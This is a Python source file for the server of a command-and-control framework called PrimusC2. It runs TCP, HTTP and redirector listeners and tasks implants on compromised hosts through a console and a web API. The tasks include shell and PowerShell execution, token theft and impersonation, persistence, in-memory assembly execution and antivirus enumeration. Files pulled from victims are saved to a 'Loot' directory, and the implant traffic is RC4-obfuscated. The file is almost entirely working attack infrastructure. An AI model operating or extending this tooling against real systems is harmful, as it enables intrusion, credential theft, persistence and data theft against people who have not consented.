import socket
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime
import string, random, os
import os.path
import shutil
import subprocess
import fcntl
import struct
from http.server import HTTPServer, SimpleHTTPRequestHandler
import http.server
import base64
import randomname
from Cryptodome.PublicKey import RSA
import re
import atexit
from rich.progress import track
import secrets
import colorama
from colorama import Fore, Back, Style
import readline
from flask import Flask
from flask import request
from flask import jsonify
import logging
from flask import cli
from queue import Queue
from flask import abort
from flask import render_template, send_from_directory, send_file
import psutil
import sys
from halo import Halo
import textwrap
from werkzeug.utils import secure_filename
import configparser
import sqlite3
from pathlib import Path
from simple_term_menu import TerminalMenu



project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.append(project_root)

from utils import RC4Util
from utils.helpfunc import *
from utils.swnamegen import swnamegen
from db.db_manager import *
from utils.ShellcodeRDI import *

cwd = os.getcwd()
rc4 = RC4Util.RC4()
template_folder = os.path.expanduser(f'{cwd[:-3]}/Web_interface/')
static_folder = os.path.expanduser(f'{cwd[:-3]}/Web_interface/primus-gui/build/')
app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
internal_app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)

def load_spinner():
    spinner = Halo(text='Provisioning and configuring the redirector, please wait. . .', spinner='dots')
    return spinner

def destroy_spinner():
    spinner = Halo(text='Destroying redirector infrastructure(VPS and Cloudflare DNS), please wait. . .', spinner='dots')
    return spinner

spinner = load_spinner()
destroy_spinner_obj = destroy_spinner()


def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')


task_queue = {}
results = {}




def print_schema():
    conn = sqlite3.connect('primus.db')
    cursor = conn.cursor()
    print(f'{Fore.LIGHTYELLOW_EX}[*] Database schema:')

    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()

    for table in tables:
        print("Table:", table[0])
        cursor.execute(f"PRAGMA table_info({table[0]});")
        columns = cursor.fetchall()
        for column in columns:
            print(column)

    conn.close()



def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    try:
        sock.bind((host_ip, int(host_port)))
    except (OSError):
        print(f'{Fore.RED}[-] Address already in use, please try another one')
    if listen_choice == "3":
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
    else:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
    
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.daemon = True
    t1.start()
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    listener = {'ID': id, 'type': 'TCP', 'port': host_port, 'interface': host_ip, 'status': 'Running'}
    add_listener_to_db(listener)

def internal_interface():
    cli.show_server_banner = lambda *_: None
    flask_t = threading.Thread(target=lambda: internal_app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False))
    flask_t.daemon = True
    flask_t.start()
    print(f'{Fore.LIGHTYELLOW_EX}[*] Internal PrimusC2 webinterface started on http://127.0.0.1:5000')

def print_interfaces():
    addrs = psutil.net_if_addrs()
    print(f'{Fore.CYAN}Interfaces on system:' + Fore.RESET)
    interfaces_list = []
    for interface in addrs.keys():
        completer.add_keyword(interface)
        interfaces_list.append(interface)
    return interfaces_list
    
    
    
# Create a dictionary to hold thread objects
threads = {}

def httpListenerHandler():
    global host_ip


    print(Fore.CYAN + '[*] Please choose an available interface to listen on below: ')



    interfaces = print_interfaces()
    while True:
        try:
            options = []
            for i in interfaces:
                options.append(i)

            terminal_menu = TerminalMenu(options)
            menu_entry_index = terminal_menu.show()

            http_host_ip = resolve_ip(options[menu_entry_index])
            break
        except:
            print(f'{Fore.RED}[-] No such interface found, please try again')

    cli.show_server_banner = lambda *_: None
    stop_threads = False
    def run():
        while True:
            app.run(host=http_host_ip, port=int(http_host_port), debug=False, use_reloader=False)
            if stop_threads:
                break

    flask_t = threading.Thread(target=run)
    flask_t.daemon = True
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    flask_t.start()

    # Add the thread object to the dictionary
    threads[id] = {'thread': flask_t, 'stop_flag': stop_threads}

    print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP listener started - Awaiting HTTP callbacks from implants on {http_host_ip}:{http_host_port}')
    listener = {'ID': id, 'type': 'HTTP', 'port': http_host_port, 'interface': http_host_ip, 'status': 'Running'}
    add_listener_to_db(listener)

# Function to stop a thread using its ID
def stop_thread(id):
    thread_info = threads.get(id)
    if thread_info is not None:
        thread_info['stop_flag'] = True
        thread_info['thread'].join()
        print(f'{Fore.GREEN}[+] Thread with ID {id} stopped successfully')
    



def HttpRedirectorListenerHandler(domain=None):
    global host_ip
    global redir_host_ip
    redir_host_ip = resolve_ip("wg0")
    cli.show_server_banner = lambda *_: None
    flask_t = threading.Thread(target=lambda: app.run(host=redir_host_ip, port=int(80), debug=False, use_reloader=False))
    flask_t.daemon = True
    flask_t.start()
    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    if domain is not None:
        update_domain_listener(id, domain)
    else:
        pass
    
    
    print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP(S) redirector started - Awaiting internal WG traffic from VPS on: {redir_host_ip}:80')
    listener = {'ID': id, 'type': 'Redirector/HTTPS', 'port': 80, 'domain': domain, 'interface': 'wg0', 'status': 'Running'}
    add_listener_to_db(listener)




def restart_listeners():
    global listener_count
    # Connect to the database.
    with sqlite3.connect('primus.db') as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        # Fetch the data for the stopped listeners.
        cursor.execute("SELECT * FROM Listeners WHERE status = 'Stopped' OR type = 'Redirector/HTTPS'")
        stopped_listeners = cursor.fetchall()

        # Iterate over the stopped listeners.
        for listener in stopped_listeners:
            # Extract the listener's ID.
            listener_ID = listener['ID']

            # Fetch all data for this listener.
            cursor.execute("SELECT * FROM Listeners WHERE ID = ?", (listener_ID,))
            listener_data = cursor.fetchone()

            # Restart the listener based on its type.
            if listener_data['type'] == 'HTTP':
                http_host_ip = listener_data['interface']
                http_host_port = listener_data['port']
                cli.show_server_banner = lambda *_: None
                flask_t = threading.Thread(target=lambda: app.run(host=http_host_ip, port=int(listener_data['port']), debug=False, use_reloader=False))
                flask_t.daemon = True
                flask_t.start()
                listener_count +=1

                cursor.execute("UPDATE Listeners SET status = 'Running' WHERE ID = ?", (listener_ID,))
                conn.commit()
            elif listener_data['type'] == 'Redirector/HTTPS':
                start_wg = subprocess.run(['wg-quick', 'up', 'wg0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if start_wg.returncode == 0:
                    print("Tunnel started")
                else:
                    print("Tunnel already running")

                redir_host_ip = resolve_ip("wg0")
                cli.show_server_banner = lambda *_: None
                flask_t = threading.Thread(target=lambda: app.run(host=redir_host_ip, port=int(80), debug=False, use_reloader=False))
                flask_t.daemon = True
                flask_t.start()
                listener_count +=1

                cursor.execute("UPDATE Listeners SET status = 'Running' WHERE ID = ?", (listener_ID,))
                conn.commit()

            elif listener_data['type'] == 'TCP':
                try:
                    sock.bind((listener_data['interface'], int(listener_data['port'])))
                    sock.listen()
                    t1 = threading.Thread(target=comm_handler)
                    t1.daemon = True
                    t1.start()
                    listener_count +=1

                    cursor.execute("UPDATE Listeners SET status = 'Running' WHERE ID = ?", (listener_ID,))
                    conn.commit()
                except (OSError):
                    print(f'{Fore.RED}[-] Address already in use, please try another one')
                    cursor.execute("UPDATE Listeners SET status = 'Failed' WHERE ID = ?", (listener_ID,))
                    conn.commit()
        
        
        interface_list = print_interfaces()
        print(Fore.CYAN + '[*] Choose interface to use for payload server: ')

        options = []
        for i in interface_list:
            options.append(i)

        terminal_menu = TerminalMenu(options)
        menu_entry_index = terminal_menu.show()
        web_srv_ip = resolve_ip(options[menu_entry_index])
        web_payload_server(web_srv_ip)
        


    # Close the database connection.
    print(f'{Fore.GREEN}[+] Listeners restarted successfully')
    conn.close()



#############################################Flask Stuff#############################################
logging.getLogger('werkzeug').disabled = True


@internal_app.route('/', defaults={'path': ''})
@internal_app.route('/<path:path>')
def serve(path):
    if path != "" and os.path.exists(internal_app.static_folder + '/' + path):
        return send_from_directory(internal_app.static_folder, path)
    else:
        return send_from_directory(internal_app.static_folder, 'index.html')

@internal_app.route('/api/start-listener', methods=['POST'])
def start_listener():
    global host_ip
    global host_port
    global listener_count
    #global http_host_port
    global http_interface
    global listen_type
    
    global domain
    global listen_id
    #global http_host_ip
    listen_id = (''.join(random.choices(string.ascii_lowercase, k=4)))
    data = request.get_json()
    listener_type = data.get('listenerType')
    if listener_type == 'HTTP':
        http_host_port = data.get('port')
        http_interface = data.get('interface')
    interface = data.get('interface')
    host_port = data.get('port')
    domain = data.get('domain')


    if listener_type == 'HTTP':
        try:
            listen_type = 'HTTP'
            return_massage = 'HTTP Listener is now running'
            http_host_ip = resolve_ip(http_interface)
            cli.show_server_banner = lambda *_: None
            flask_t = threading.Thread(target=lambda: app.run(host=http_host_ip, port=int(http_host_port), debug=False, use_reloader=False))
            flask_t.daemon = True
            flask_t.name = listen_id
            flask_t.start()

            
            print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP listener started - Awaiting HTTP callbacks from implants on {http_host_ip}:{http_host_port}')
            listener_count +=1
            listener = {'ID':listen_id, 'type': listener_type, 'port': host_port, 'interface': http_interface, 'status': 'Running'}
            add_listener_to_db(listener)
        except:
            return_massage = 'An error occurred while starting the HTTP listener'
        
    if listener_type == 'TCP':
        try:
            listen_type = 'TCP'
            return_massage = 'TCP Listener is now running'
            host_ip = resolve_ip(interface)
            
            sock.bind((host_ip, int(host_port)))

    
            print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
        
            sock.listen()
            t1 = threading.Thread(target=comm_handler)
            t1.daemon = True
            t1.start()
            listener_count +=1
            listener = {'ID':listen_id, 'type': listener_type, 'port': host_port, 'interface': interface, 'status': 'Running'}
            add_listener_to_db(listener)
        except:
            return_massage = 'An error occurred while starting the TCP listener'
    
    if listener_type == 'Redirector/HTTPS':
        try:
            listen_type = 'Redirector/HTTPS'
            return_massage = 'Redirector and listener is now running'
            redirector_http(domain)
            HttpRedirectorListenerHandler(domain)
            listener_count +=1
        except:
            return_massage = 'An error occurred while provisioning the Redirector and starting the HTTPS listener'
    
    return jsonify({'message': f'{return_massage}'})

@internal_app.route('/api/interact', methods=['POST'])
def interact():
    global target_id
    data = request.get_json()
    command = data.get('command')
    target_id = data.get('target_id')
    
    if len(command) == 0:
        return jsonify({'message': 'No command provided'}), 400
    elif command == 'help':
        return jsonify({'message': help_implant_GUI()}), 200
    elif command == 'help callbacks':
        return jsonify({'message': callbacks_help()}), 200
    elif command == 'help steal_token':
        return jsonify({'message': steal_token_help()}), 200
    elif command == 'help rev2self':
        return jsonify({'message': rev2self_help()}), 200
    elif command == 'help whoami':
        return jsonify({'message': whoami_help()}), 200
    elif command == 'help tShell':
        return jsonify({'message': tShell_help()}), 200
    elif command == 'help pwsh':
        return jsonify({'message': pwsh_help()}), 200
    elif command == 'help shell':
        return jsonify({'message': shell_help()}), 200
    elif command == 'help cd':
        return jsonify({'message': cd_help()}), 200
    elif command == 'help ls':
        return jsonify({'message': ls_help()}), 200
    elif command == 'help pwd':
        return jsonify({'message': pwd_help()}), 200
    elif command == 'help exit':
        return jsonify({'message': exit_help()}), 200
    elif command == 'help sleep':
        return jsonify({'message': sleep_help()}), 200
    elif command == 'help persist':
        return jsonify({'message': persist_help()}), 200
    elif command == 'help pwsh_cradle':
        return jsonify({'message': pwsh_cradle_help()}), 200
    elif command == 'help GetAV':
        return jsonify({'message': GetAV_help()}), 200
    elif command == 'help download':
        return jsonify({'message': download_help()}), 200
    elif command == 'help background':
        return jsonify({'message': background_help()}), 200
    elif command == 'help execute-ASM':
        return jsonify({'message': execute_ASM_help()}), 200
    elif command == 'help payloads':
        return jsonify({'message': payloads_help()}), 200
    elif command == 'exit':
        kill_http(target_id, command)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'execute-ASM':
        global outfile
        args = list(command.split(" "))
        if len(args) > 0:
            CSharpToNimByteArray(args[1])
        else:
            print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
            return                
        try:
            with open(outfile, "r") as f:
                rub = f.read()
            size = os.stat(outfile).st_size
            print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')

            add_task_to_db(command, target_id, rub)
        except:
            return jsonify({'message': 'An error occurred while executing the command'}), 500
    elif command == 'GetAV':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'cd':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command == 'pwd':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'ls':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'shell':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'pwsh':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command == 'payloads':
        return jsonify({'message': payload_list()}), 200
    elif command.split(" ")[0] == 'persist':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'steal_token':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'rev2self':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'whoami':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'tShell':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'download':
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    elif command.split(" ")[0] == 'sleep':
        sleep_time = int(command.split(" ")[1])  
        update_sleep(sleep_time, target_id)
        add_task_to_db(command, target_id)
        return jsonify({'message': 'command added to task queue'}), 200
    else:
        return jsonify({'message': 'Command not recognized'}), 400

    return jsonify({'message': 'Command added to task queue successfully'}), 200


@internal_app.route('/api/update_note', methods=['POST'])
def update_note():
    data = request.get_json()
    target_id = data.get('id')
    note = data.get('note')
    update_note_db(target_id, note)
    return jsonify({'message': 'Note updated successfully'}), 200

@internal_app.route('/api/get_results', methods=['GET'])
def get_results():
    target_id = request.args.get('target_id')
    results = fetch_result_to_gui(target_id)
    if results:
        return jsonify({'results': results}), 200
    else:
        return jsonify({'error': 'No results for this target_id'}), 400
    
@internal_app.route('/api/fetch_command_history', methods=['GET'])
def fetch_command_history():
    target_id = request.args.get('target_id')
    command_his = command_history(target_id)
    if command_his:
        return jsonify(command_his), 200
    else:
        return jsonify({'error': 'No command history for this target_id'}), 400

@internal_app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    addrs = psutil.net_if_addrs()
    interfaces = list(addrs.keys())
    return jsonify(interfaces)

@internal_app.route('/api/listener-types', methods=['GET'])
def get_listener_types():
    listener_types = ['HTTP', 'Redirector/HTTPS']
    return jsonify(listener_types)

@internal_app.route('/api/callbacks', methods=['GET'])
def show_callbacks():
    try:
        session_counter = 0
        cbGui = display_callbacks_gui()
        session_counter += 1
        
        return jsonify(cbGui)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@internal_app.route('/api/callbackdata_by_id/<target_id>', methods=['GET'])
def callback_data_by_id(target_id):
    try:
        cb_data = json_callback_data_by_id(target_id)
        return jsonify(cb_data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@internal_app.route('/api/listeners', methods=['GET'])
def show_listeners():
    listeners_gui= get_listeners_gui()
    return jsonify(listeners_gui)

@internal_app.route('/api/keywords', methods=['GET'])
def add_keywords():
    payload_keyword_add()
    return jsonify(keywords)

@internal_app.route('/api/upload', methods=['POST'])
def upload_file():
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    if 'file' not in request.files:
        return 'No file part', 400
    file = request.files['file']
    if file.filename == '':
        return 'No selected file', 400
    if file:
        filename = secure_filename(file.filename)
        file.save(os.path.join(payload_loc, filename))
        return 'File uploaded successfully', 200

@internal_app.route('/api/payloads', methods=['GET'])
def payloads():
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    payloads_avail = os.listdir(payload_loc)
    return jsonify(payloads_avail)

@internal_app.route('/api/compile-implant', methods=['POST'])
def compile_implant():
    data = request.get_json()
    listenerType = data['type']
    domain = data['domain']
    ip = data['interface']
    port = data['port']
    compile_format = data['format']


    if listenerType == 'HTTP':
        return nimplant_HTTP("1", True, ip, port, compile_format)
    elif listenerType == 'TCP':
        return nimplant("1", True)
    elif listenerType == 'Redirector/HTTPS':
        return nimplant_HTTP("3", True, domain,None, compile_format)
    else:
        return 'Invalid listener type', 400

@app.route('/reg', methods=['POST'])
def register():
    
    # Access the data sent in the request
    data = request.get_json()

    # Extract the necessary information from the data
    
    key_validation = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'authKey')))
    if key_validation != auth_key:
        print(f'{Fore.RED}[-] An error occurred while registering the implant, likely due to incorrect key\n'+Fore.LIGHTYELLOW_EX +'Enter command#>', end="")
        return abort(403)
    id = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'id')))
    username = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'username')))
    os = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'os')))
    isadmin = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'isAdmin')))
    hostname = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'hostname')))
    publicIP = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'publicIP')))
    amsi = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'amsi')))
    if isadmin == "1":
        admin_value = 'Yes'
    else:
        admin_value = 'No'
    if 'windows' in os:
        pay_val = 1
    else:
        pay_val = 2
    
    if amsi == "0":
        amsi = 'Disabled'
    else:
        amsi = 'Running'
    
    task_queue[id] = []
    cur_time = time.strftime("%H:%M:%S",time.localtime())
    date = datetime.now()
    time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
    
    listen_type_check = "HTTP"
    if hostname is not None:
        targets.append([listen_type_check,id, f"{hostname}@{publicIP}", time_record, username, admin_value, os, pay_val,'Active',amsi]) #Appending info to targets list
        callback={'id': id,'type':listen_type_check ,'username': username, 'adminStatus': admin_value, 'status': 'Active', 'target': f"{hostname}@{publicIP}", 'OS': os,'amsi':amsi ,'latest_callbacktime': time_record}
        add_callback_to_db(callback)
        callback_keyword_add()
        print(f'{Fore.GREEN}[+] Callback received from {hostname}@{publicIP}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
        
    else: 
        targets.append([id, publicIP, time_record, username, admin_value, os, 'Active'])
        print(f'{Fore.LIGHTYELLOW_EX}[+] Callback received from {publicIP}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
        # Return a response
        
    return '200'

@app.route('/tasks/<agent_id>', methods=['GET'])
async def serve_tasks(agent_id):
    
    # Check if the agent exists in the task queues
        cur_time = time.strftime("%H:%M:%S",time.localtime())
        date = datetime.now()
        cb_time = (f'{date.day}/{date.month}/{date.year} {cur_time}')
        update_callback_time(agent_id, cb_time)

        tasks = fetch_tasks_from_db(agent_id)
        if tasks:
            tasks_list = []
            for task in tasks:
                if task[0] is not None:
                    tasks_list.append(rc4.obf(RCKey,task[0]))
                if task[1] is not None:
                    tasks_list.append(rc4.obf(RCKey,task[1]))
            return jsonify(tasks_list)
        else:
            return '404'


@app.route('/result', methods=['POST'])
async def send_results():

    data = request.get_json()
    agent_id = data[rc4.obf(RCKey,'id')]
    agent_id = rc4.deobf(RCKey,agent_id)

    impersonationStatus = data[rc4.obf(RCKey,'impersonating')]
    impersonationStatus = rc4.deobf(RCKey,impersonationStatus)
    
    if request.headers.get('X-Upload') == 'true':
        try:

            print(f'Result from implant ID: {agent_id}')
            result = data[rc4.obf(RCKey,'data')]
            result = rc4.deobf(RCKey, result)
            filename = data[rc4.obf(RCKey,'filename')]
            filename = rc4.deobf(RCKey, filename)


            cwd_payload = os.getcwd()
            loot_loc = os.path.expanduser(f'{cwd_payload}/Loot')

            with open(f"{loot_loc}/{filename}", "w") as f:
                f.write(result)
            print(f'{Fore.GREEN}[+] File saved to loot directory at: {loot_loc}/{filename}')
            print(f'{Fore.LIGHTYELLOW_EX}{targets[num][3]}/{targets[num][1]}#>', end="")
        except:
            print(f'{Fore.RED}[-] An error occurred while receiving the file from the implant(likely due to encoding issues)')
            pass
    
    elif impersonationStatus == 'true':
        context = data[rc4.obf(RCKey,'context')]
        context = rc4.deobf(RCKey,context)
        print(f'Result from implant ID: {agent_id}')
        result = data[rc4.obf(RCKey,'data')]
        result = rc4.deobf(RCKey, result)
        impersonation_add(agent_id, context)

        cb_data = fetch_callback_data(agent_id)
        usernamecb = cb_data['username']

        update_task_status(result, agent_id)
        
        print(f'\n{Fore.LIGHTYELLOW_EX}Response received from task:{Fore.RESET}\n{result}\n{Fore.LIGHTWHITE_EX}{Fore.LIGHTWHITE_EX}{{{target_id}}}::{{{usernamecb}}}#> ', end="")
        formatted_result = f'\nResponse received from task:\n{result}\n'
        
        results[agent_id] = formatted_result
        
        directory = os.getcwd()
        cleandir = os.listdir( directory )
        for item in cleandir:
            if item.endswith("NimByteArray.txt"):
                os.remove( os.path.join( directory, item ) )
    

    else:
    # Access the data sent in the request
        
            # Extract the necessary information from the data
            print(f'Result from implant ID: {agent_id}')
            result = data[rc4.obf(RCKey,'data')]
            result = rc4.deobf(RCKey, result)
            context = data[rc4.obf(RCKey,'context')]
            context = rc4.deobf(RCKey,context)
            impersonation_remove(agent_id, context)

            cb_data = fetch_callback_data(agent_id)
            usernamecb = cb_data['username']

            update_task_status(result, agent_id)
            
            print(f'\n{Fore.LIGHTYELLOW_EX}Response received from task:{Fore.RESET}\n{result}\n{Fore.LIGHTWHITE_EX}{Fore.LIGHTWHITE_EX}{{{target_id}}}::{{{usernamecb}}}#> ', end="")
            formatted_result = f'\nResponse received from task:\n{result}\n'
            
            results[agent_id] = formatted_result
            
            directory = os.getcwd()
            cleandir = os.listdir( directory )
            for item in cleandir:
                if item.endswith("NimByteArray.txt"):
                    os.remove( os.path.join( directory, item ) )



    return '200'

def add_task(command):
    if target_id not in task_queue:
        task_queue[target_id] = []
    task_queue[target_id].append(rc4.obf(RCKey,command))

def add_task_UI(command, target_id):
    if target_id not in task_queue:
        task_queue[target_id] = []
    task_queue[target_id].append(rc4.obf(RCKey,command))


def kill_http(target_id, command):
    add_task(command)
    add_task_UI(command, target_id)
    add_task_to_db(command, target_id)
    update_callback_status('Dead', target_id)
    

def http_target_comm(target_id, username=None):
    while True:
        user_context = get_user(target_id)
        command = input(f'{Fore.LIGHTWHITE_EX}{{{target_id}}}::{{{user_context}}}#> ') 
        if len(command) == 0:
            continue
        elif command == 'help':
            help_implant()
        elif command == 'help callbacks':
            callbacks_help()
        elif command == 'help pwsh':
            pwsh_help()
        elif command == 'help shell':
            shell_help()
        elif command == 'help cd':
            cd_help()
        elif command == 'help ls':
            ls_help()
        elif command == 'help steal_token':
            steal_token_help()
        elif command == 'help rev2self':
            rev2self_help()
        elif command == 'help whoami':
            whoami_help()
        elif command == 'help tShell':
            tShell_help()
        elif command == 'help pwd':
            pwd_help()
        elif command == 'help exit':
            exit_help()
        elif command == 'help sleep':
            sleep_help()
        elif command == 'help persist':
            persist_help()
        elif command == 'help pwsh_cradle':
            pwsh_cradle_help()
        elif command == 'help GetAV':
            GetAV_help()
        elif command == 'help download':
            download_help()
        elif command == 'help background':
            background_help()
        elif command == 'help execute-ASM':
            execute_ASM_help()
        elif command == 'help payloads':
            payloads_help()
        
        elif command == 'exit':
            add_task_to_db(command, target_id)
            update_callback_status('Dead', target_id)
            break

        elif command == 'background':
            break

        elif command.split(" ")[0] == 'execute-ASM':
            global outfile
            args = list(command.split(" "))
            if len(args) > 0:
                CSharpToNimByteArray(args[1])
            else:
                print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                return                
            try:
                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                add_task_to_db(command, target_id, rub)
            except:
                pass
        elif command == 'GetAV':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'cd':
            add_task_to_db(command, target_id)
        elif command == 'pwd':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'ls':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'steal_token':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'rev2self':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'shell':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'whoami':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'tShell':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'pwsh':
            add_task_to_db(command, target_id)
        elif command == 'payloads':
            payload_list()
        elif command.split(" ")[0] == 'persist':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'download':
            add_task_to_db(command, target_id)
        elif command.split(" ")[0] == 'sleep':
            sleep_time = int(command.split(" ")[1])  
            update_sleep(sleep_time, target_id)
            add_task_to_db(command, target_id)   
        else:
            print(f'{Fore.LIGHTYELLOW_EX}[*] Command not recognized')

    
def fix_base64_padding(base64_string):
    # Calculate the number of padding characters needed
    missing_padding = len(base64_string) % 4
    # Add the necessary padding
    if missing_padding:
        base64_string += b'=' * (4 - missing_padding)
    return base64_string

def comm_in(target_id):
    try:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting response...')

        size_data = target_id.recv(1024).decode()
        print(f'{Fore.LIGHTYELLOW_EX}[*] Size of response is: {size_data}')
        size = int(size_data.strip())

        # Receive the entire message
        output = b""
        while len(output) < size:
            chunk = target_id.recv(1024)
            if not chunk:
                break
            output += chunk
        output1 = fix_base64_padding(output)
        decoded_output = base64.urlsafe_b64decode(output1)
        result = decoded_output.decode().strip() + '\n'

        # Clear the buffer before returning
        target_id.recv(1024)
        return result
    except:
        print(f'{Fore.RED}[-] An error occurred while receiving data from the target')
        pass

def comm_out(target_id, message):
    message = str(message + '\n')
    target_id.send(message.encode())
    

def kill_signal(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    while True:
        message = input(f'{Fore.LIGHTWHITE_EX}{targets[num][4]}/{targets[num][2]}#> ') + '\n'
        if len(message) == 0:
            continue
        if message == 'help':
            help_implant()
            
        else:
            comm_out(target_id, message)
            if message == 'exit\n':
                target_id.send(message.encode())
                target_id.close()
                targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
                break
            if message == 'background\n':
                break

            if message == 'help\n':
                help_implant()
            
            if message == 'payloads':
                payload_list()
           
             
            if message == 'GetAV':
                pass

            if message.split(" ")[0] == 'execute-ASM':
                global outfile
                args = list(message.split(" "))
                if len(args) > 0:
                    CSharpToNimByteArray(args[1])
                else:
                    print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                    return                

                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                size1 = str(size)
                comm_out(target_id, size1)
                print(Fore.GREEN + "[+] Sent asm size to client")
                rub = str(rub) + "\n"
                target_id.send(rub.encode())
                print(Fore.GREEN + "[+] Sent asm to client")
                os.remove(outfile)
                response = comm_in(target_id)
                print(response)
                
                
            else:
                response = comm_in(target_id)
                if response == 'exit':
                    print(Fore.RED + '[-] The client has terminated the session')
                    target_id.close()
                    break
                print(response)


def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            key_validation = remote_target.recv(4096).decode()
            key_validation = base64.b64decode(key_validation).decode()
            if key_validation == auth_key:
                username = remote_target.recv(4096).decode()
                username = base64.b64decode(username).decode()
                admin = remote_target.recv(4096).decode()
                admin = base64.b64decode(admin).decode()
                operating_system = remote_target.recv(4096).decode()
                operating_system = base64.b64decode(operating_system).decode()
                host_name = remote_target.recv(4096).decode()
                host_name = base64.b64decode(host_name).decode()
                public_ip = remote_target.recv(4096).decode()
                public_ip = base64.b64decode(public_ip).decode()
                if admin == "1":
                    admin_value = 'Yes'
                elif username == 'root':
                    admin_value = 'Yes'
                else:
                    admin_value = 'No'
                if 'windows' in operating_system:
                    pay_val = 1
                else:
                    pay_val = 2
                amsi_tcp = "N/A"
                cur_time = time.strftime("%H:%M:%S",time.localtime())
                date = datetime.now()
                time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')


                listen_type_check = "TCP"
                if host_name is not None:
                    targets.append([listen_type_check,remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active', amsi_tcp]) #Appending info to targets list
                    print(f'{Fore.GREEN}[+] Callback received from {host_name}@{public_ip}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
                    callback_keyword_add()
                else: 
                    targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
                    print(f'{Fore.LIGHTYELLOW_EX}[+] Callback received from {remote_ip[0]}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
            else:
                remote_target.close()
        except:
            pass


